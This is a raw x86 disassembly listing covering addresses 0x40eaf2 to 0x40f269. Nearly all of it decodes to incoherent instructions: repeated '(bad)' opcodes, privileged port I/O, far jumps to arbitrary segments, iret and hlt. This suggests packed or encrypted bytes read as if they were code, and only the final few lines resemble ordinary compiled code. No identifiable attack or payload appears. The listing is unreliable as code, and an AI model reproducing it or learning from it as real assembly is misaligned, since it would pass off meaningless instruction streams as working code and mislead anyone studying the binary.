  40eaf2:	adc    edi,DWORD PTR [esi-0x68e17306]
  40eaf8:	push   cs
  40eaf9:	add    DWORD PTR [esi+0x63],edx
  40eafc:	inc    esi
  40eafd:	xchg   ebx,eax
  40eafe:	push   edx
  40eaff:	fisttp DWORD PTR [edx+0x50]
  40eb02:	cmp    esp,DWORD PTR [ebp-0x6051f591]
  40eb08:	das    
  40eb09:	fisubr WORD PTR [edx]
  40eb0b:	(bad)  [esp+ebp*4-0x1c]
  40eb0f:	cwde   
  40eb10:	das    
  40eb11:	fxch   st(6)
  40eb13:	push   eax
  40eb14:	or     DWORD PTR [eax+0x38],ebx
  40eb17:	in     eax,dx
  40eb18:	push   es
  40eb19:	and    DWORD PTR [eax+0x1a],ebp
  40eb1c:	inc    edx
  40eb1d:	add    eax,0xb10360ca
  40eb22:	jmp    0xe495:0x2aceaf3a
  40eb29:	iret   
  40eb2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb2b:	add    BYTE PTR [esi+0xb],0x14
  40eb2f:	xchg   esp,eax
  40eb30:	ret    
  40eb31:	es in  eax,0xb4
  40eb34:	cmp    eax,0xe0443d4f
  40eb39:	sub    BYTE PTR [esi+0x5d1b4766],0x65
  40eb40:	scas   al,BYTE PTR es:[edi]
  40eb41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb42:	outs   dx,BYTE PTR ds:[esi]
  40eb43:	inc    esi
  40eb44:	sbb    BYTE PTR [ecx],0xc1
  40eb47:	outs   dx,DWORD PTR ds:[esi]
  40eb48:	push   0xffffffb8
  40eb4a:	lea    ebp,[ebx+0x1d]
  40eb4d:	div    DWORD PTR [ebp-0x42]
  40eb50:	ror    cl,cl
  40eb52:	mov    edx,0xdcdfcce5
  40eb57:	call   0x15992e87
  40eb5c:	ins    BYTE PTR es:[edi],dx
  40eb5d:	js     0x40eb78
  40eb5f:	mov    BYTE PTR [ebp-0x26],dh
  40eb62:	push   cs
  40eb63:	xchg   esp,eax
  40eb64:	adc    eax,0xf8d26f4f
  40eb69:	enter  0x9a5d,0x18
  40eb6d:	and    ecx,eax
  40eb6f:	cmp    eax,0xf15d18d0
  40eb74:	in     eax,0xe6
  40eb76:	mov    ah,BYTE PTR [ebp+0x7cca6b44]
  40eb7c:	xor    dl,dh
  40eb7e:	mov    dh,0xe6
  40eb80:	jo     0x40eb3c
  40eb82:	icebp  
  40eb83:	inc    esp
  40eb84:	push   esi
  40eb85:	add    dh,BYTE PTR [edi+0x1c10503c]
  40eb8b:	mov    ebx,0x3e179117
  40eb90:	xor    ah,BYTE PTR [edi]
  40eb92:	stos   BYTE PTR es:[edi],al
  40eb93:	and    BYTE PTR [esp+ebp*1],dh
  40eb96:	pop    esi
  40eb97:	or     ecx,DWORD PTR [edi+0x1f]
  40eb9a:	cmp    DWORD PTR [ecx+0x43],0x75
  40eb9e:	iret   
  40eb9f:	lods   eax,DWORD PTR ds:[esi]
  40eba0:	sub    DWORD PTR [ebx-0x54],ebx
  40eba3:	jl     0x40ebc6
  40eba5:	xchg   DWORD PTR [edx],ebp
  40eba7:	pusha  
  40eba8:	cmp    eax,0x2e
  40ebab:	icebp  
  40ebac:	mov    cl,0xf9
  40ebae:	call   0xe054:0xf274f407
  40ebb5:	inc    ebx
  40ebb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb7:	push   ebp
  40ebb8:	fs pop esp
  40ebba:	or     eax,0xb9ab871d
  40ebbf:	in     eax,dx
  40ebc0:	or     DWORD PTR [ecx+0x7dac96dd],ecx
  40ebc6:	adc    edi,DWORD PTR [eax-0x67]
  40ebc9:	xor    edi,edi
  40ebcb:	sbb    BYTE PTR [edx],al
  40ebcd:	jo     0x40ebe6
  40ebcf:	das    
  40ebd0:	loope  0x40eb9e
  40ebd2:	cld    
  40ebd3:	pop    eax
  40ebd4:	sub    eax,0x2082da1
  40ebd9:	iret   
  40ebda:	inc    esp
  40ebdb:	das    
  40ebdc:	test   DWORD PTR [ebp-0x12],edx
  40ebdf:	dec    ecx
  40ebe0:	xchg   esi,eax
  40ebe1:	push   0xb03d5de6
  40ebe6:	ins    BYTE PTR es:[edi],dx
  40ebe7:	mov    dl,0x1d
  40ebe9:	adc    BYTE PTR [eax],cl
  40ebeb:	cli    
  40ebec:	inc    ebx
  40ebed:	ins    DWORD PTR es:[edi],dx
  40ebee:	imul   ebp,DWORD PTR [edx+0x4a],0x7c
  40ebf2:	scas   al,BYTE PTR es:[edi]
  40ebf3:	xor    al,0xdb
  40ebf5:	or     al,0x5f
  40ebf7:	in     eax,0xd5
  40ebf9:	adc    eax,0x1c51e0b
  40ebfe:	cmp    eax,0xa6aa2612
  40ec03:	dec    ebx
  40ec04:	add    eax,0xfae5f114
  40ec09:	push   edx
  40ec0a:	dec    ebx
  40ec0b:	mov    BYTE PTR [ecx-0x11],bh
  40ec0e:	jnp    0x40ec64
  40ec10:	repnz (bad) 
  40ec12:	sub    BYTE PTR [ecx-0x16],ah
  40ec15:	outs   dx,DWORD PTR ds:[esi]
  40ec16:	or     dl,BYTE PTR ds:0x1a1504d7
  40ec1c:	push   edx
  40ec1d:	push   ecx
  40ec1e:	gs push ds
  40ec20:	call   0xd442:0x3d15acff
  40ec27:	sbb    DWORD PTR [ecx-0x287f65ee],0x9f72fbfe
  40ec31:	pop    esi
  40ec32:	xchg   DWORD PTR [edx-0x73c05dac],ecx
  40ec38:	pop    ss
  40ec39:	dec    DWORD PTR ds:0xc4568357
  40ec3f:	hlt    
  40ec40:	xor    BYTE PTR [edx+0x8948fbb],bh
  40ec46:	enter  0xc051,0x7a
  40ec4a:	dec    edx
  40ec4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec4c:	and    ecx,esi
  40ec4e:	xchg   DWORD PTR [esi],ecx
  40ec50:	mov    DWORD PTR [ebx+0x4abdeb0b],ebp
  40ec56:	dec    edx
  40ec57:	pop    esi
  40ec58:	xor    bl,bl
  40ec5a:	mov    dl,0x67
  40ec5c:	inc    esp
  40ec5d:	loop   0x40ec9a
  40ec5f:	(bad)  
  40ec60:	xlat   BYTE PTR ds:[ebx]
  40ec61:	out    dx,eax
  40ec62:	retf   0xdb50
  40ec65:	pop    ebp
  40ec66:	add    al,0xdf
  40ec68:	mov    WORD PTR [ecx+0x2e5c239],ss
  40ec6e:	inc    edx
  40ec6f:	iret   
  40ec70:	loopne 0x40ec9e
  40ec72:	jo     0x40ecc1
  40ec74:	add    bl,BYTE PTR [edi*8-0x6535ecd2]
  40ec7b:	cli    
  40ec7c:	dec    ecx
  40ec7d:	(bad)  
  40ec7e:	ret    0x284e
  40ec81:	push   ecx
  40ec82:	adc    bl,BYTE PTR [esi-0x12]
  40ec85:	stc    
  40ec86:	adc    esp,DWORD PTR [eax+edx*2+0x542eea6e]
  40ec8d:	sti    
  40ec8e:	dec    ecx
  40ec8f:	popa   
  40ec90:	pop    ecx
  40ec91:	pop    es
  40ec92:	nop
  40ec93:	sahf   
  40ec94:	cwde   
  40ec95:	scas   eax,DWORD PTR es:[edi]
  40ec96:	ins    DWORD PTR es:[edi],dx
  40ec97:	pop    eax
  40ec98:	pop    ebx
  40ec99:	stos   BYTE PTR es:[edi],al
  40ec9a:	dec    ebp
  40ec9b:	inc    ebx
  40ec9c:	ins    DWORD PTR es:[edi],dx
  40ec9d:	pop    esi
  40ec9e:	es call 0xc5d7:0xbacdb661
  40eca6:	add    al,0x45
  40eca8:	push   eax
  40eca9:	bound  ebp,QWORD PTR [ecx]
  40ecab:	mov    eax,ds:0x848e87cb
  40ecb0:	pop    edi
  40ecb1:	out    0xa2,eax
  40ecb3:	pop    edx
  40ecb4:	push   cs
  40ecb5:	sahf   
  40ecb6:	jno    0x40ec97
  40ecb8:	in     al,dx
  40ecb9:	or     al,0x3
  40ecbb:	push   ebx
  40ecbc:	aad    0x1b
  40ecbe:	lahf   
  40ecbf:	pop    ecx
  40ecc0:	(bad)  
  40ecc2:	jbe    0x40ecf3
  40ecc4:	adc    BYTE PTR [ebx],al
  40ecc6:	popa   
  40ecc7:	pop    esp
  40ecc8:	add    ah,bh
  40ecca:	fist   WORD PTR [ebx+0x4c3beb03]
  40ecd0:	ins    DWORD PTR es:[edi],dx
  40ecd1:	rcl    BYTE PTR [esi-0x4b166e2f],cl
  40ecd7:	int3   
  40ecd8:	adc    ch,BYTE PTR [edx+0x65e3a1d0]
  40ecde:	aam    0x9e
  40ece0:	in     eax,0xf0
  40ece2:	sub    al,0xd5
  40ece4:	ds cwde 
  40ece6:	add    ebp,DWORD PTR [edx]
  40ece8:	je     0x40ec97
  40ecea:	ret    0xfb81
  40eced:	je     0x40ec9c
  40ecef:	das    
  40ecf0:	xchg   esp,eax
  40ecf1:	cmp    edi,DWORD PTR [edx]
  40ecf3:	int    0x18
  40ecf5:	in     eax,0xaf
  40ecf7:	lahf   
  40ecf8:	out    0xf5,al
  40ecfa:	cmp    dl,BYTE PTR [ebx+ecx*2-0x281a9ab5]
  40ed01:	mov    edi,0x8e151898
  40ed06:	cdq    
  40ed07:	ret    
  40ed08:	sbb    BYTE PTR [eax],ah
  40ed0a:	aaa    
  40ed0b:	daa    
  40ed0c:	lea    ebx,[esi]
  40ed0e:	dec    edi
  40ed0f:	dec    ecx
  40ed10:	add    dl,BYTE PTR [esi-0x2385bfa1]
  40ed16:	mov    eax,ds:0x4279262d
  40ed1b:	jne    0x40ed89
  40ed1d:	dec    ecx
  40ed1e:	mov    edx,0x60f1922c
  40ed23:	repnz mov eax,0x10cf8a5c
  40ed29:	cmp    al,0x90
  40ed2b:	test   eax,0x5a310eeb
  40ed30:	pop    ds
  40ed31:	mov    edx,0x87ff0555
  40ed36:	daa    
  40ed37:	ds jmp 0xb0f3840
  40ed3d:	imul   DWORD PTR [esp+edx*2+0x70]
  40ed41:	jb     0x40ed0d
  40ed43:	aas    
  40ed44:	add    eax,0xa8ac7407
  40ed49:	mov    dh,0x3f
  40ed4b:	push   0x1e4a894e
  40ed50:	fcomip st,st(1)
  40ed52:	out    dx,al
  40ed53:	jle    0x40ed14
  40ed55:	jecxz  0x40ed46
  40ed57:	and    dl,dh
  40ed59:	pop    ebp
  40ed5a:	xchg   ebp,eax
  40ed5b:	gs push edi
  40ed5d:	push   ecx
  40ed5e:	cwde   
  40ed5f:	xor    al,BYTE PTR [ecx]
  40ed61:	add    al,0x3f
  40ed63:	xor    DWORD PTR ds:0x45da7e82,0x79
  40ed6a:	loop   0x40ed2c
  40ed6c:	xchg   ebx,eax
  40ed6d:	cli    
  40ed6e:	and    cl,bh
  40ed70:	fistp  WORD PTR [edi+0x7]
  40ed73:	xor    DWORD PTR [esi-0x4931910b],0x70
  40ed7a:	test   eax,0x63187823
  40ed7f:	mov    esp,0x9064924f
  40ed84:	sub    eax,0xec09294f
  40ed89:	les    ebx,FWORD PTR [esi]
  40ed8b:	test   al,0x16
  40ed8d:	dec    edx
  40ed8e:	fiadd  DWORD PTR [ebx-0x1f]
  40ed91:	xor    eax,edx
  40ed93:	or     DWORD PTR [esi],ebx
  40ed95:	sub    al,0x87
  40ed97:	(bad)  
  40ed98:	das    
  40ed99:	inc    ecx
  40ed9a:	and    BYTE PTR [edx-0x61],0x23
  40ed9e:	sub    dl,BYTE PTR [edx-0x76266e5e]
  40eda4:	adc    esp,DWORD PTR [edx]
  40eda6:	pop    ebp
  40eda7:	adc    eax,0xc7ac6bd3
  40edac:	out    0x9b,eax
  40edae:	pop    ebx
  40edaf:	frstor [edx+0x322ca765]
  40edb5:	jecxz  0x40edbe
  40edb7:	jnp    0x40edf0
  40edb9:	aas    
  40edba:	popf   
  40edbb:	push   eax
  40edbc:	stos   BYTE PTR es:[edi],al
  40edbd:	inc    edx
  40edbe:	mov    DWORD PTR [ecx*8+0x645f296d],edi
  40edc5:	mov    bl,0x56
  40edc7:	jne    0x40ee23
  40edc9:	in     eax,dx
  40edca:	dec    ebx
  40edcb:	pusha  
  40edcc:	or     al,0x26
  40edcf:	ja     0x40ed69
  40edd1:	add    DWORD PTR [edi-0x1a],edi
  40edd4:	mov    ebp,0xecb6d828
  40edd9:	lock fs xor BYTE PTR fs:[ecx+0x21f88dc],al
  40ede2:	test   DWORD PTR [esi-0x24a99f37],edx
  40ede8:	cmp    eax,edx
  40edea:	test   DWORD PTR [eax-0x3e0becd4],eax
  40edf0:	xlat   BYTE PTR ds:[ebx]
  40edf1:	and    BYTE PTR [edx+0xb],0x16
  40edf5:	out    0x28,eax
  40edf7:	cmp    eax,0xfaf2550d
  40edfc:	jecxz  0x40eda4
  40edfe:	out    dx,eax
  40edff:	ror    bl,0xbb
  40ee02:	scas   al,BYTE PTR es:[edi]
  40ee03:	sub    al,0x93
  40ee05:	cld    
  40ee06:	pop    ebp
  40ee07:	aaa    
  40ee08:	jne    0x40edae
  40ee0a:	scas   al,BYTE PTR es:[edi]
  40ee0b:	enter  0x597b,0xce
  40ee0f:	punpckhwd mm0,QWORD PTR [esi-0x79]
  40ee13:	out    0x3c,eax
  40ee15:	dec    ebx
  40ee16:	mov    ds:0xb8af0788,eax
  40ee1b:	nop
  40ee1c:	jle    0x40ee5c
  40ee1e:	jmp    0x40edb7
  40ee20:	adc    DWORD PTR [esi+0x9baa4ee],eax
  40ee26:	or     bh,BYTE PTR ds:0xf7cb267b
  40ee2c:	adc    DWORD PTR [ecx],ecx
  40ee2e:	mov    eax,ds:0x3eddb110
  40ee33:	sub    dh,BYTE PTR ds:0xffcdf678
  40ee39:	xchg   edi,eax
  40ee3a:	pop    edi
  40ee3b:	mov    ebx,0xac902cd9
  40ee40:	ficomp DWORD PTR [edi+0x4f89fcd7]
  40ee46:	xor    eax,0x8472d351
  40ee4b:	outs   dx,BYTE PTR ds:[esi]
  40ee4c:	and    bl,ah
  40ee4e:	popa   
  40ee4f:	pusha  
  40ee50:	jp     0x40ee63
  40ee52:	push   ecx
  40ee53:	xor    ecx,esi
  40ee55:	lahf   
  40ee56:	push   ecx
  40ee57:	mov    ebx,0xd9d8b57c
  40ee5c:	rcr    BYTE PTR [ebx-0x57d6f126],1
  40ee62:	push   edi
  40ee63:	scas   al,BYTE PTR es:[edi]
  40ee64:	jl     0x40eede
  40ee66:	sub    eax,0x5f921f6
  40ee6b:	sbb    bh,bl
  40ee6d:	ret    
  40ee6e:	jl     0x40ee50
  40ee70:	imul   ebx,DWORD PTR [ecx],0xffffffc8
  40ee73:	call   0x96606f92
  40ee78:	adc    bl,BYTE PTR [esi+0x8]
  40ee7b:	xchg   bl,dl
  40ee7d:	dec    esi
  40ee7e:	cmp    eax,0x6aa74e6b
  40ee83:	jmp    0x8b00:0x413b9aa3
  40ee8a:	inc    ebp
  40ee8b:	cld    
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	adc    eax,0x3e7f06ff
  40eeab:	test   eax,0x79a77c7c
  40eeb0:	jl     0x40ef2e
  40eeb2:	sbb    DWORD PTR [ebx+0x15],ecx
  40eeb5:	fld    TBYTE PTR [ebp+edx*8+0x4c]
  40eeb9:	ret    0xfac0
  40eebc:	add    esi,DWORD PTR [ebp+0x12]
  40eebf:	test   DWORD PTR [ecx+0x7a],esp
  40eec2:	inc    ebp
  40eec3:	stos   DWORD PTR es:[di],eax
  40eec5:	or     dl,BYTE PTR [ecx+0x493c8f61]
  40eecb:	daa    
  40eecc:	sbb    DWORD PTR [ecx],eax
  40eece:	mov    eax,0x94f1ebb3
  40eed3:	dec    edi
  40eed4:	push   0xcd10216c
  40eed9:	xor    al,0x8a
  40eedb:	mov    DWORD PTR [edi-0x75],ecx
  40eede:	nop
  40eedf:	mov    dh,0xf7
  40eee1:	pop    ebx
  40eee2:	jbe    0x40ef04
  40eee4:	mov    eax,ds:0xbe0109f9
  40eee9:	mov    ebp,0x2f848c05
  40eeee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeef:	dec    esp
  40eef0:	clc    
  40eef1:	cmp    bh,0xf0
  40eef4:	mov    ebx,0x66eb8ffb
  40eef9:	push   ds
  40eefa:	xor    ecx,ecx
  40eefc:	or     BYTE PTR es:[esi+ecx*1-0x2d],dl
  40ef01:	push   0x3cfccde0
  40ef06:	cld    
  40ef07:	arpl   sp,dx
  40ef09:	sbb    DWORD PTR [edx+0x7a],ebx
  40ef0c:	inc    eax
  40ef0d:	(bad)  
  40ef0e:	xor    eax,0xacb6d8ef
  40ef13:	scas   eax,DWORD PTR es:[edi]
  40ef14:	or     BYTE PTR [esi],dh
  40ef16:	cmp    ch,BYTE PTR [edx+0x1ba0b578]
  40ef1c:	mov    ebp,DWORD PTR [edi-0x16ff54c5]
  40ef22:	jns    0x40ef60
  40ef24:	popa   
  40ef25:	or     DWORD PTR [eiz*8+0x257a2dbc],ebp
  40ef2c:	(bad)  
  40ef2d:	pop    edi
  40ef2e:	fild   QWORD PTR [eax+0x602bbd49]
  40ef34:	add    BYTE PTR [edi+esi*8],0x86
  40ef38:	xor    al,0x8e
  40ef3a:	mov    ebp,0x3df38e12
  40ef3f:	adc    BYTE PTR [eax],ah
  40ef41:	jb     0x40efb1
  40ef43:	inc    ebx
  40ef44:	mov    dl,0x5a
  40ef46:	retf   0xe927
  40ef49:	fld    TBYTE PTR [edx+0x42a44db7]
  40ef4f:	iret   
  40ef50:	outs   dx,BYTE PTR ds:[esi]
  40ef51:	pop    ss
  40ef52:	push   ebx
  40ef53:	xchg   ebp,eax
  40ef54:	mov    ds:0xa784f765,eax
  40ef59:	ja     0x40eedf
  40ef5b:	push   edi
  40ef5c:	mov    esp,0xea71e2a8
  40ef61:	retf   
  40ef62:	push   edi
  40ef63:	shl    BYTE PTR [ecx],0x1a
  40ef66:	adc    DWORD PTR [eax],ebp
  40ef68:	and    al,BYTE PTR [ecx-0x58a41ee2]
  40ef6e:	sti    
  40ef6f:	mov    ebp,0x8815b421
  40ef74:	dec    ebp
  40ef75:	mov    eax,ds:0xe6be4b51
  40ef7a:	pop    ebp
  40ef7b:	add    BYTE PTR [eax+0x3e],bh
  40ef7e:	dec    esi
  40ef7f:	or     BYTE PTR [esi],al
  40ef81:	xchg   esi,eax
  40ef82:	inc    ebx
  40ef83:	cmp    dl,dh
  40ef85:	mov    dh,0xce
  40ef87:	ja     0x40ef80
  40ef89:	out    dx,al
  40ef8a:	loope  0x40ef7e
  40ef8c:	je     0x40ef71
  40ef8e:	fidiv  DWORD PTR [edi]
  40ef90:	mov    eax,0x3e67f578
  40ef95:	jbe    0x40ef87
  40ef97:	adc    BYTE PTR [eax],0xbb
  40ef9a:	or     eax,eax
  40ef9c:	loop   0x40f00a
  40ef9e:	or     eax,0xe3c37419
  40efa3:	xchg   esi,eax
  40efa4:	push   eax
  40efa5:	stos   DWORD PTR es:[edi],eax
  40efa6:	(bad)  
  40efa7:	push   ds
  40efa8:	in     al,dx
  40efa9:	jge    0x40ef4a
  40efab:	hlt    
  40efac:	scas   al,BYTE PTR es:[edi]
  40efad:	xchg   DWORD PTR [esi-0x4a446503],ebx
  40efb3:	sbb    esp,DWORD PTR [esi+0x26]
  40efb6:	clc    
  40efb7:	adc    DWORD PTR [edx],ebx
  40efb9:	and    dh,BYTE PTR [edx]
  40efbb:	and    edx,esi
  40efbd:	loop   0x40ef7e
  40efbf:	fisubr DWORD PTR [ecx+0x47]
  40efc2:	jno    0x40efed
  40efc4:	and    edi,DWORD PTR [ebp+0x3ae70891]
  40efca:	xor    cl,BYTE PTR [ebp-0x3c200ab5]
  40efd0:	mov    esi,0x32e9d7dd
  40efd5:	pop    esp
  40efd6:	into   
  40efd7:	and    ch,cl
  40efd9:	cmp    al,0xe2
  40efdb:	hlt    
  40efdc:	pop    ds
  40efdd:	ror    DWORD PTR [ecx-0x1cbbb17a],0xc7
  40efe4:	fidivr DWORD PTR [esp+edx*2+0x330dd9ec]
  40efeb:	xchg   ebp,eax
  40efec:	neg    al
  40efee:	xchg   ebx,eax
  40efef:	push   ss
  40eff0:	and    ah,BYTE PTR [ebx+0x2c07650a]
  40eff6:	(bad)  
  40eff7:	fbstp  TBYTE PTR [ecx+0x1201503a]
  40effd:	aam    0x60
  40efff:	clc    
  40f000:	push   esp
  40f001:	jg     0x40f00d
  40f003:	fisub  WORD PTR [ecx+ecx*4+0x68]
  40f007:	(bad)  
  40f008:	(bad)  
  40f009:	ja     0x40f06a
  40f00b:	(bad)  
  40f00c:	pop    ecx
  40f00d:	test   eax,0x6ff3ac5b
  40f012:	and    esi,DWORD PTR [di-0x6a]
  40f016:	jne    0x40f00d
  40f018:	adc    dh,BYTE PTR [eax-0x4b]
  40f01b:	loopne 0x40efaf
  40f01d:	pop    ebx
  40f01e:	les    eax,FWORD PTR [edi-0x38]
  40f021:	ins    DWORD PTR es:[edi],dx
  40f022:	inc    esi
  40f023:	call   0x5d12a872
  40f028:	add    BYTE PTR [edi-0x65],cl
  40f02b:	and    eax,0x67dd135
  40f030:	mov    dl,0x92
  40f032:	clc    
  40f033:	lahf   
  40f034:	add    eax,0x911a0d33
  40f039:	imul   DWORD PTR [edx]
  40f03b:	ret    
  40f03c:	mov    dh,0x4d
  40f03e:	and    al,0x59
  40f040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f041:	es scas al,BYTE PTR es:[edi]
  40f043:	adc    al,BYTE PTR [ebx+esi*2-0xa]
  40f047:	mov    edi,0xc9714d1f
  40f04c:	and    al,0x8a
  40f04e:	pop    eax
  40f04f:	push   ebp
  40f050:	cmp    bh,BYTE PTR [ecx+0x77468508]
  40f056:	pop    esp
  40f057:	push   esp
  40f058:	mov    ch,0x60
  40f05a:	push   edx
  40f05b:	out    0x4f,eax
  40f05d:	xor    bl,BYTE PTR [edx-0x375952c0]
  40f063:	jmp    0x15e63f95
  40f068:	popa   
  40f069:	adc    BYTE PTR ds:0xe4bb9125,bh
  40f06f:	aas    
  40f070:	pop    ss
  40f071:	push   ds
  40f072:	jae    0x40f0b4
  40f074:	rol    DWORD PTR [edi+0x1e840f63],1
  40f07a:	mov    ebx,0x4e701f2
  40f07f:	mov    eax,ds:0xc3814ada
  40f084:	sar    esp,cl
  40f086:	test   BYTE PTR [edi+0x1c],ch
  40f089:	loopne 0x40f01b
  40f08b:	mov    dl,0xe5
  40f08d:	pop    edi
  40f08e:	int    0xa0
  40f090:	mov    edi,0x69ba2ea2
  40f095:	popf   
  40f096:	xchg   edx,eax
  40f097:	popa   
  40f098:	push   es
  40f099:	add    edx,esp
  40f09b:	or     BYTE PTR [edx+edi*1],dl
  40f09e:	fnsave ds:0x126eac32
  40f0a4:	sub    al,0x39
  40f0a6:	call   0xd6bd:0x32106873
  40f0ad:	inc    esi
  40f0ae:	xchg   DWORD PTR [ebp+0x78],ebp
  40f0b1:	jno    0x40f0eb
  40f0b3:	add    BYTE PTR [edx+ebp*2],ch
  40f0b6:	xchg   ebp,eax
  40f0b7:	jl     0x40f0a6
  40f0b9:	(bad)  
  40f0ba:	int3   
  40f0bb:	xchg   edi,eax
  40f0bc:	out    0x2c,eax
  40f0be:	and    eax,0xe554bfa9
  40f0c3:	xor    BYTE PTR [ebp+0x2f76b1cd],cl
  40f0c9:	or     eax,0x860f1e60
  40f0ce:	push   ebx
  40f0cf:	adc    DWORD PTR [ebx-0x27],ebx
  40f0d2:	mov    esi,0xa7352b97
  40f0d7:	jno    0x40f125
  40f0d9:	in     eax,0x9b
  40f0db:	mov    ecx,0x58f4b2cb
  40f0e0:	inc    edx
  40f0e1:	loop   0x40f09a
  40f0e3:	adc    edx,ebp
  40f0e5:	test   DWORD PTR [ebp+0x78f92a20],eax
  40f0eb:	fsubrp st(2),st
  40f0ed:	pop    ebp
  40f0ee:	add    esp,edx
  40f0f0:	retf   0x627c
  40f0f3:	xchg   esp,eax
  40f0f4:	loopne 0x40f079
  40f0f6:	fwait
  40f0f7:	push   esp
  40f0f8:	nop
  40f0f9:	pusha  
  40f0fa:	push   edi
  40f0fb:	(bad)  
  40f0fc:	and    eax,0xbb247c79
  40f101:	dec    edx
  40f102:	jge    0x40f152
  40f104:	je     0x40f0d6
  40f106:	pop    ds
  40f107:	pop    ebx
  40f108:	jge    0x40f0cb
  40f10a:	enter  0x7b1f,0x3b
  40f10e:	jbe    0x40f12a
  40f110:	add    eax,0x3f958619
  40f115:	inc    edx
  40f116:	mov    edx,0x1ff901e3
  40f11b:	into   
  40f11c:	mov    eax,0xdd32b688
  40f121:	xchg   ebx,eax
  40f122:	xchg   esp,eax
  40f124:	fiadd  WORD PTR [edi+0x75]
  40f127:	(bad)  [eax+0x680c347d]
  40f12d:	sbb    ecx,DWORD PTR [esi]
  40f12f:	mov    ecx,DWORD PTR [esi-0x4f]
  40f132:	shr    BYTE PTR [edi],cl
  40f134:	test   ah,ah
  40f136:	lea    edx,[edi]
  40f138:	xor    ebx,DWORD PTR [ecx+esi*1-0x17]
  40f13c:	das    
  40f13d:	and    dl,BYTE PTR [edx+0x57]
  40f140:	ja     0x40f0f9
  40f142:	out    0x19,eax
  40f144:	sub    ch,ch
  40f146:	jae    0x40f167
  40f148:	fs sar dl,0x33
  40f14c:	sbb    eax,0x12953d73
  40f151:	popa   
  40f152:	int    0xb8
  40f154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f155:	jmp    0x4e4:0xf6c7cc43
  40f15c:	xchg   ecx,eax
  40f15d:	pop    ebp
  40f15e:	cld    
  40f15f:	sub    BYTE PTR [ebx],bh
  40f161:	into   
  40f162:	aam    0x4c
  40f164:	add    al,0x6a
  40f166:	add    ah,BYTE PTR [ebp-0x57]
  40f169:	cmp    DWORD PTR [ecx+esi*1],edi
  40f16c:	sub    DWORD PTR [edx-0x2a77759a],esi
  40f172:	imul   esi,esp,0xffffffba
  40f175:	fistp  QWORD PTR [ebp-0x2d76cab0]
  40f17b:	mov    bl,0x3d
  40f17d:	add    al,0x6c
  40f17f:	std    
  40f180:	lahf   
  40f181:	jb     0x40f198
  40f183:	mov    eax,ds:0x2d6d9c73
  40f188:	sub    DWORD PTR [ecx+0x65],edi
  40f18b:	int    0x78
  40f18d:	xchg   BYTE PTR [esi],bl
  40f18f:	jle    0x40f1f6
  40f191:	jmp    0x43544ac4
  40f196:	sub    ch,cl
  40f198:	dec    ebp
  40f199:	mov    al,0xeb
  40f19b:	xchg   eax,edx
  40f19d:	xor    BYTE PTR [edx],ch
  40f19f:	rcr    BYTE PTR ss:[esi+0x1d],1
  40f1a3:	cdq    
  40f1a4:	ret    
  40f1a5:	dec    ebx
  40f1a6:	mov    ch,0x57
  40f1a8:	repnz xchg esi,eax
  40f1aa:	sub    dh,bl
  40f1ac:	retf   0x6deb
  40f1af:	fst    DWORD PTR [ecx+0x37f073d4]
  40f1b5:	clc    
  40f1b6:	push   es
  40f1b7:	out    0x34,al
  40f1b9:	je     0x40f1ba
  40f1bb:	pop    esi
  40f1bc:	adc    DWORD PTR [ecx+0x68],esi
  40f1bf:	mov    bl,0x24
  40f1c1:	ds stc 
  40f1c3:	mov    cl,0x46
  40f1c5:	mov    dl,BYTE PTR [ebx+0x2744660]
  40f1cb:	fmul   DWORD PTR [eiz*8-0x28801d80]
  40f1d2:	or     eax,0x7e36ca5f
  40f1d7:	lea    ebp,[ecx]
  40f1d9:	adc    DWORD PTR [edx],esi
  40f1db:	sub    al,0xf9
  40f1dd:	cli    
  40f1de:	cs sbb al,0x66
  40f1e1:	push   si
  40f1e3:	or     al,0x6
  40f1e5:	push   ss
  40f1e6:	es mov dh,0x82
  40f1e9:	ins    DWORD PTR es:[edi],dx
  40f1ea:	ss ret 
  40f1ec:	mov    ds:0xcc48009f,al
  40f1f1:	and    ecx,DWORD PTR [edi+esi*8]
  40f1f4:	es daa 
  40f1f6:	xchg   ebx,eax
  40f1f7:	bound  ebx,QWORD PTR [esi-0x37]
  40f1fa:	ja     0x40f22a
  40f1fc:	lods   al,BYTE PTR ds:[esi]
  40f1fd:	jno    0x40f227
  40f1ff:	sub    bh,BYTE PTR [edx+0x42]
  40f202:	sub    DWORD PTR [esi-0x78],ebx
  40f205:	sti    
  40f206:	mov    esp,ebx
  40f208:	add    ah,BYTE PTR ds:0x8bbeded5
  40f20e:	bound  esi,QWORD PTR [eax+0x4b]
  40f211:	ret    
  40f212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f213:	cmc    
  40f214:	sub    eax,0xd30fc762
  40f219:	dec    eax
  40f21a:	cs inc eax
  40f21c:	sub    ch,dh
  40f21e:	fs dec esi
  40f220:	imul   esp,DWORD PTR [ecx-0x1],0x40be1504
  40f227:	inc    ebx
  40f228:	ret    
  40f229:	xchg   edi,eax
  40f22a:	lds    edx,FWORD PTR [ebx]
  40f22c:	cmp    eax,DWORD PTR [ebp+ebx*4-0x6f7ad8b6]
  40f233:	(bad)  
  40f234:	aad    0x12
  40f236:	gs dec esi
  40f238:	pusha  
  40f239:	or     esp,DWORD PTR [edx-0xd]
  40f23c:	int    0xa0
  40f23e:	out    0xc1,eax
  40f240:	xchg   ecx,eax
  40f241:	mov    ebx,0xfade463a
  40f246:	sahf   
  40f247:	lds    ebx,FWORD PTR [ebp-0x4c3ab427]
  40f24d:	jmp    0xe6ed:0x6ef082ba
  40f254:	repz fisttp QWORD PTR [esi-0x52]
  40f258:	lods   al,BYTE PTR ds:[esi]
  40f259:	scas   al,BYTE PTR es:[edi]
  40f25a:	push   WORD PTR [ebp-0x8]
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
